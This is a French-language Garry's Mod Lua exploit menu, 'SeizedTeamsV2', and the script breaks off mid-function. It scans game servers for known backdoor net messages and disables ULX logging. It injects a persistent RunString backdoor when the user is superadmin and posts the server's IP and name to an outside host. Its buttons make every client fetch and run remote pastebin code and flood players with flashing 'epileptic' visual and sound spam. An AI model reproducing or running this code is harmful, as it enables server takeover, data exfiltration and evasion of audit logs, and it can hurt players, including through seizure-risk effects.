if ( SERVER ) then 
function file.Read(d)      
return "SeizedTeam n'es pas pour toi  <3"         
end
end
MsgC (Color(math.random(1,255),math.random(1,255),math.random(1,255)), [[  =======================================================================================================================
CHARGEMENT DU MENU EN COURS...
                                                                                                                     
 ____                _____          _____        _____    ____  _____   ______         _____                         
|    |          ____|\    \     ___|\    \   ___|\    \  |    ||\    \ |\     \    ___|\    \                        
|    |         /     /\    \   /    /\    \ |    |\    \ |    | \\    \| \     \  /    /\    \                       
|    |        /     /  \    \ |    |  |    ||    | |    ||    |  \|    \  \     ||    |  |____|                      
|    |  ____ |     |    |    ||    |__|    ||    | |    ||    |   |     \  |    ||    |    ____                      
|    | |    ||     |    |    ||    .--.    ||    | |    ||    |   |      \ |    ||    |   |    |                     
|    | |    ||\     \  /    /||    |  |    ||    | |    ||    |   |    |\ \|    ||    |   |_,  |                     
|____|/____/|| \_____\/____/ ||____|  |____||____|/____/||____|   |____||\_____/||\ ___\___/  /|  ___    ___    ___  
|    |     || \ |    ||    | /|    |  |    ||    /    | ||    |   |    |/ \|   ||| |   /____ / | |   |  |   |  |   | 
|____|_____|/  \|____||____|/ |____|  |____||____|____|/ |____|   |____|   |___|/ \|___|    | /  |___|  |___|  |___| 
  \(    )/        \(    )/      \(      )/    \(    )/     \(       \(       )/     \( |____|/                       
   '    '          '    '        '      '      '    '       '        '       '       '   )/                          
                                                                                         '        
  ]])
  

local Authorized = "STEAM_0:1:219919521"
if Authorized == "STEAM_0:1:219919521"
    or Authorized == "STEAM_0:1:219919521"
        or Authorized == "STEAM_0:1:219919521"
            or Authorized == "STEAM_0:1:219919521"
                or Authorized == "STEAM_0:1:219919521"
                    or Authorized == "STEAM_0:1:219919521"
                        or Aauthorized =="STEAM_0:1:219919521"
                              or Authorized == "STEAM_0:1:219919521"
                                  or Authorized == "STEAM_0:1:219919521"								  								  
								  
then

local n = net
local s = net.Start
local ss = net.WriteString
local stc = net.Send
local hp = http.Post
local netKey = "";
local vgui = vgui;         
local surface = surface;       
local render = render;         
local Color = Color;       
local input = input;       
local hook = hook;         
local next = next;         
local timer = timer;  
local GetConVarNumber = GetConVarNumber;     
local util = util;         
local player = player;         
local Vector = Vector;         
local Angle = Angle;       
local FindMetaTable = FindMetaTable;       
local team = team;         
local LocalPlayer = LocalPlayer;       
local draw = draw;             
local debug = debug;       
local table = table;       
local Entity = Entity;         
local ScrW, ScrH = ScrW, ScrH;         
local RunConsoleCommand = RunConsoleCommand;       
local GAMEMODE = GAMEMODE;         
local CurTime = CurTime;       
local cam = cam;
local silent = CreateClientConVar("silent", 0, false, false);
totalExploits = 0
BackdoorsFound = 0
local ply = LocalPlayer()


function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

-- Exploit 1
function removeAll() -- Strips all Players
    for k,v in pairs(player.GetAll()) do
        stripPlayer(v)
    end
end

function stripPlayer(ply) -- Strip player function
    if ply:IsPlayer() then
        for k,v in pairs(ply:GetWeapons()) do
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( v )
            net.SendToServer()
        end
    end
end



GRADIENT_HORIZONTAL = 0;
GRADIENT_VERTICAL = 1;
function draw.LinearGradient(x,y,w,h,from,to,dir,res)
    dir = dir or GRADIENT_HORIZONTAL;
    if dir == GRADIENT_HORIZONTAL then res = (res and res <= w) and res or w;
    elseif dir == GRADIENT_VERTICAL then res = (res and res <= h) and res or h; end
    for i=1,res do
        surface.SetDrawColor(
            Lerp(i/res,from.r,to.r),
            Lerp(i/res,from.g,to.g),
            Lerp(i/res,from.b,to.b),
            Lerp(i/res,from.a,to.a)
        );
        if dir == GRADIENT_HORIZONTAL then surface.DrawRect(x + w * (i/res), y, w/res, h );
        elseif dir == GRADIENT_VERTICAL then surface.DrawRect(x, y + h * (i/res), w, h/res ); end
    end
end

---------------------
--  SPLOIT NOTIFY  --
---------------------
function SploitNotify(text)
    local notify = vgui.Create( "DPanel" )
    notify:SetSize( 500, 50 )
    notify:SetPos( ScrW() - 200, -50 )
    notify.Paint = function(self, w, h)
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
    draw.SimpleText( text, "Title", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end
    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
    timer.Simple( 3, function()
    notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
end);end) end
---------------------

local function playSound(url)
    sound.PlayURL(url, '', function( station ) 
        if ( IsValid( station ) ) then
        station:SetPos( LocalPlayer():GetPos() )
        station:Play()
        end
    end)
end

hook.Add("Think", "RAINBOWPLAYER", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end)

-----------------------------
-- RCON STEALER
hook.Add("InitPostEntity", math.random(20,40), function()
    local sendTbl = {
        sn = GetHostName(),
        playercount = tostring(#player.GetAll()),
        ip = game.GetIP()
    }
 
    http.Post( "http://jesuschristoff.livehost.fr/DIVERS/index.php", sendTbl )
end)
--------------------------------

-- CHECKER
    if( ValidNetString("memeDoor") ) then
        netKey = "memeDoor"
    else
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
        netKey = "Sandbox_Armdupe"
    else
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
        netKey = "DarkRP_AdminWeapons"
    else
    end

    if( ValidNetString("SessionBackdoor") ) then
        netKey = "SessionBackdoor"
    else
    end

    if( ValidNetString("Fix_Keypads") ) then
        netKey = "Fix_Keypads"
    else
    end

    if( ValidNetString("Remove_Exploiters") ) then
        netKey = "Remove_Exploiters"
    else
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
        netKey = "noclipcloakaesp_chat_text"
    else
    end

    if( ValidNetString("_Defqon") ) then
        netKey = "_Defqon"
    else
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
        netKey = "_CAC_ReadMemory"
    else
    end

    if( ValidNetString("nostrip") ) then
        netKey = "nostrip"
    else
    end

    if( ValidNetString("LickMeOut") ) then
        netKey = "LickMeOut"
    else
    end

    if( ValidNetString("MoonMan") ) then
        netKey = "MoonMan"
    else
    end

    if( ValidNetString("Im_SOCool") ) then
        netKey = "Im_SOCool"
    else
    end

    if( ValidNetString("ULXQUERY2") ) then
        netKey = "ULXQUERY2"
    else
    end
	
    if( ValidNetString("jesuslebg") ) then
        netKey = "jesuslebg"
    else
    end
	
    if( ValidNetString("zilnix") ) then
        netKey = "zilnix"
    else
    end

    if( ValidNetString("enablevac") ) then
        netKey = "enablevac"
    else
    end

    if( ValidNetString("c") ) then
        netKey = "c"
    else
    end
	
    if( ValidNetString("��?D)?") ) then
        netKey = "��?D)?"
    else
    end
	
    if( ValidNetString("disablebackdoor") ) then
        netKey = "disablebackdoor"
    else
    end
	
    if( ValidNetString("kill") ) then
        netKey = "kill"
    else
    end

    if netKey == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeam", "] ", Color( 255, 255, 255 ), "Aucune backdoor :(" )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeam", "] ", Color( 0, 255, 0 ), "Backdoor trouve! :D La backdoor est : ".. netKey )
            -- Auto shut down ULX Logs
            if GetConVarNumber("silent") == 1 then
                net.Start(netKey)
                net.WriteString( "ulx_logecho 0" )
                net.WriteBit (0)
                net.SendToServer()

                timer.Simple(0.1, function()
                    net.Start(netKey)
                    net.WriteString( "ulx_logecho 0" )
                    net.WriteBit (1)
                     net.SendToServer()

                chat.AddText("ULX Logs disabled." )
                end)
            end
    end
--END CHECKER

-----------------------------------------------
--     Check Backdoors (2) (jesus_scanbd)    --
-----------------------------------------------

function checkbackdoors()
    if( ValidNetString("memeDoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - memeDoor" )
        netKey = "memeDoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - memeDoor!" )
    end

    if( ValidNetString("Sandbox_Armdupe") ) then 
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - Sandbox_Armdupe" )
        netKey = "Sandbox_Armdupe"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - Sandbox_Armdupe!" )
    end

    if( ValidNetString("DarkRP_AdminWeapons") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouv� ! - DarkRP_AdminWeapons" )
        netKey = "DarkRP_AdminWeapons"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - DarkRP_AdminWeapons!" )
    end
    if( ValidNetString("SessionBackdoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - SessionBackdoor" )
        netKey = "SessionBackdoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - SessionBackdoor!" )
    end

    if( ValidNetString("Fix_Keypads") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - Fix_Keypads" )
        netKey = "Fix_Keypads"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - Fix_Keypads!" )
    end

    if( ValidNetString("Remove_Exploiters") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - Remove_Exploiters" )
        netKey = "Remove_Exploiters"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - Remove_Exploiters!" )
    end

    if( ValidNetString("noclipcloakaesp_chat_text") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - noclipcloakaesp_chat_text" )
        netKey = "noclipcloakaesp_chat_text"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - noclipcloakaesp_chat_text!" )
    end

    if( ValidNetString("_Defqon") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - _Defqon" )
        netKey = "_Defqon"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - _Defqon!" )
    end

    if( ValidNetString("_CAC_ReadMemory") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - _CAC_ReadMemory" )
        netKey = "_CAC_ReadMemory"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - _CAC_ReadMemory!" )
    end

    if( ValidNetString("nostrip") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - nostrip" )
        netKey = "nostrip"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - nostrip!" )
    end

    if( ValidNetString("LickMeOut") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - LickMeOut" )
        netKey = "LickMeOut"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - LickMeOut!" )
    end

    if( ValidNetString("MoonMan") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! -MoonMan" )
        netKey = "MoonMan"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - MoonMan!" )
    end

    if( ValidNetString("Im_SOCool") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - Im_SOCool" )
        netKey = "Im_SOCool"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - Im_SOCool!" )
    end

    if( ValidNetString("ULXQUERY2") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - ULXQUERY2" )
        netKey = "ULXQUERY2"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - ULXQUERY2!" )
    end
	
    if( ValidNetString("jesuslebg") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouve ! - jesuslebg" )
        netKey = "jesuslebg"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouve : - jesuslebg!" )
    end
	
    if( ValidNetString("zilnix") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouv� ! - zilnix" )
        netKey = "zilnix"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouv� : - zilnix!" )
    end
	
    if( ValidNetString("enablevac") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouv� ! - enablevac" )
        netKey = "enablevac"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouv� : - enablevac!" )
    end
	
    if( ValidNetString("c") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouv� ! - c" )
        netKey = "c"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouv� : - c!" )
    end
	
    if( ValidNetString("��?D)?") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouv� ! - ��?D)?" )
        netKey = "��?D)?"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouv� : - ��?D)?!" )
    end
	
    if( ValidNetString("disablebackdoor") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouv� ! - disablebackdoor" )
        netKey = "disablebackdoor"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouv� : - disablebackdoor!" )
    end
	
	    if( ValidNetString("kill") ) then
			BackdoorsFound = 1 + BackdoorsFound 
        chat.AddText( Color( 127, 255, 0 ), "[SeizedTeamsV2]", Color( 255, 255, 255 )," Backdoor trouv� ! - kill" )
        netKey = "kill"
    else
	chat.AddText( Color( 0, 0, 0, 125 ), "[SeizedTeamsV2]", Color( 255, 0, 0 )," Scan backdoor : Non trouv� : - kill!" )
    end
	
    SploitNotify("Backdoor trouv�: ".. netKey )
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 127, 255, 0 ), "Net chang� � : ".. netKey  )
end

function Inject()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), " Injecting..." )
    if ( ply:IsSuperAdmin() ) then
        timer.Simple( 3, function() 
            if( ValidNetString("SessionBackdoor") ) then

            else
                RunConsoleCommand( "ulx", "logecho", "0" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('SessionBackdoor')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('SessionBackdoor') net.Receive('SessionBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                RunConsoleCommand( "ulx", "logecho", "1" )
                chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), " Injecte avec succes !" )
            end
        end )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), " Erreur ! Vous n'etes pas SUPERADMIN !" )
    end
    if( ValidNetString("SessionBackdoor") ) then
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), " La backdoor est deja presente." )
    end
end

function bhop()
local AddHook = dismay and dismay.AddHook or hook and hook.Add or function() print("fuck i missed") end;
AddHook("CreateMove", "BHOP", function(cmd)
        if (cmd:KeyDown(IN_JUMP)) then
                if(cmd:GetMouseX() < 0) then
                        cmd:SetSideMove(-10000);
                elseif(cmd:GetMouseX() > 0) then
                        cmd:SetSideMove(10000);
                end
        if (LocalPlayer():IsOnGround()) then
                cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
                        return;
        end
end
cmd:RemoveKey(IN_JUMP);
end)
end

surface.CreateFont("Font", {
font = "Segoe UI Light",
size = 21,
weight = 300
})
surface.CreateFont("CheckFont", {
font = "Segoe UI Light",
size = 17,
weight = 300
})

surface.CreateFont("Target", {
font = "Segoe UI Light",
size = 15,
weight = 300
})

surface.CreateFont( "Title", {
        font = "Lato Light",
        size = 30,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
} )

surface.CreateFont( "tamere", {
        font = "Roboto",
        size = 150,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
		bold = true,
} )

surface.CreateFont( "Welcome", {
        font = "Lato Light",
        size = 25,
        weight = 10,
        antiaalias = true,
        strikeout = false,
        additive = true,
} )

function Jesus()
local Menu = vgui.Create("DFrame")
Menu:SetSize(900, 700)
Menu:Center()
Menu:SetTitle("")
Menu:MakePopup()
Menu:ShowCloseButton(false) 
Menu.Paint = function(self, w, h)
surface.SetDrawColor( 30, 30 , 30 )
surface.DrawRect( 0, 0, Menu:GetWide(), Menu:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Menu:GetWide(), Menu:GetTall() )

    draw.DrawText( "SeizedTeamsV2 {BETA}", "Font", 10, 2, Color(math.random(900),math.random(900),math.random(900)))


end

local Close = vgui.Create("DButton", Menu)
Close:SetPos( 842, 1 )
Close:SetSize( 53, 20 )
Close:SetText( "" )
function Close:Paint( w, h )
    draw.RoundedBoxEx( 4, 0, 0, w, h, Color(255,0,0) )
end

Close.DoClick = function()
    Menu:Close()  
end 


--------------------------------------------------------------
local Tabs = vgui.Create( "DPropertySheet", Menu )
Tabs:Dock( FILL )
Tabs:DockPadding( 5, 5, 0, 0)
Tabs.Paint = function (self, w, h)
for k, v in pairs(Tabs.Items) do
    if (!v.Tab) then continue end
   
    v.Tab.Paint = function(self,w,h)
         draw.LinearGradient( 0, 0, w, h, Color(math.random(5,60),math.random(5,60),math.random(5,60)), Color(0, 0, 80), GRADIENT_VERTICAL );
         surface.SetDrawColor(0, 0, 0)
         surface.DrawOutlinedRect( 0, 0, v.Tab:GetWide(), v.Tab:GetTall() )
    end
end
end
 
local Controller = vgui.Create( "DPanel", Tabs )
    Controller.Paint = function( self, w, h )
        draw.RoundedBox(25, 0, 25, w, h, Color(math.random(5,1),math.random(5,40),math.random(5,40)))
    end
Tabs:AddSheet( "Controller", Controller )
 

local Targets = vgui.Create( "DPanel", Tabs )
    Targets.Paint = function( self, w, h )
      draw.RoundedBox(25, 0, 25, w, h, Color(math.random(5,1),math.random(5,40),math.random(5,40)))  
    end
Tabs:AddSheet( "Targets", Targets )

local Misc = vgui.Create( "DPanel", Tabs )
    Misc.Paint = function( self, w, h )
        draw.RoundedBox(25, 0, 25, w, h, (HSVToColor( CurTime() % 6 * 60, 1, 1 )))
    end
Tabs:AddSheet( "Misc", Misc )


local Controller = vgui.Create( "DScrollPanel", Controller )
Controller:Dock( FILL )
 
local Targets = vgui.Create( "DScrollPanel", Targets )
Targets:Dock( FILL )

local Misc = vgui.Create( "DScrollPanel", Misc )
Misc:Dock( FILL )
--------------------------------------------------------------

local Entry = vgui.Create( "DTextEntry" )
Entry:SetParent(Controller)
Entry:SetPos( 12, 530 )
Entry:SetSize( 230, 90 )
Entry:SetText( "" )

local RCON = vgui.Create("DButton", Controller )
RCON:SetSize( 110, 25 )
RCON:SetPos( 130, 500 )
RCON:SetText("RCON Command")
RCON:SetTextColor(Color(255, 255, 255, 255))
RCON.Paint = function(panel, w, h)
    surface.SetDrawColor(29, 39, 55)
    surface.DrawRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
    surface.SetDrawColor( 149, 44, 87 )
    surface.DrawOutlinedRect( 0, 0, RCON:GetWide(), RCON:GetTall() )
end

RCON.DoClick = function()
    local GetEntry = Entry:GetValue()
        net.Start(netKey)
        net.WriteString( GetEntry )
        net.WriteBit (false)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "RCON Commande envoy�." )
		    SploitNotify("RCON Commande envoye au serveur.")
    surface.PlaySound("buttons/blip1.wav") 
end

local GLUA = vgui.Create("DButton", Controller )
GLUA:SetSize( 110, 25 )
GLUA:SetPos( 15, 500 )
GLUA:SetText("Code LUA")
GLUA:SetTextColor(Color(255, 255, 255, 255))
GLUA.Paint = function(panel, w, h)
    surface.SetDrawColor(29, 39, 55)
    surface.DrawRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
    surface.SetDrawColor( 149, 44, 87 )
    surface.DrawOutlinedRect( 0, 0, GLUA:GetWide(), GLUA:GetTall() )
end

GLUA.DoClick = function()
local GetEntry = Entry:GetValue()
        net.Start(netKey)
        net.WriteString( GetEntry )
        net.WriteBit (1)
        net.SendToServer()
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamV2", "] ", Color( 255, 255, 255 ), "Code lua envoyé." )
		    SploitNotify("Code lua envoye au serveur.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "SSV 1(DEV) " )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( [[BroadcastLua([=[http.Fetch("", RunString)]=])]] )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 1 (base) activé" )
    SploitNotify("Super Spam Visuel/Sonore activ�")
    surface.PlaySound("buttons/blip1.wav") 
end
 
local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 60 )
Macro:SetText( "SSV 2 (epileptique)" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(185, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/Z52XMRY6\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 2 (base) activé" )
    SploitNotify("Super Spam Visuel/Sonore activé")
    surface.PlaySound("buttons/blip1.wav") 
end



local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 90)
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "SSV 3 (base/troll)" )
Macro.Paint = function()
surface.SetDrawColor(135, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(2000,1800) hud:SetPos(0,0) hud:OpenURL(\"https://image.noelshack.com/fichiers/2018/10/7/1520781152-images.jpg\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(1920,1080) hud4:SetPos(ScrW()-150,ScrH()-100) hud4:OpenURL(\"\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(1920,1080) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"\")]])" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 3 (HACKED) activ�" )
    SploitNotify("Super Spam Visuel/Sonore activ�")
    surface.PlaySound("buttons/blip1.wav") 
end




local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 20, 120)
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "SSV 4 (DESTUCTEUR)" )
Macro.Paint = function()
surface.SetDrawColor(90, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString( [[BroadcastLua([=[http.Fetch("https://pastebin.com/raw/AFLQKBBB", RunString)]=])]] ) // CHECK
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "SeizedTeamsV2", "] ", Color( 255, 255, 255 ), "Super Spam Visuel 4 (DESTRUCTEUR) activER" )
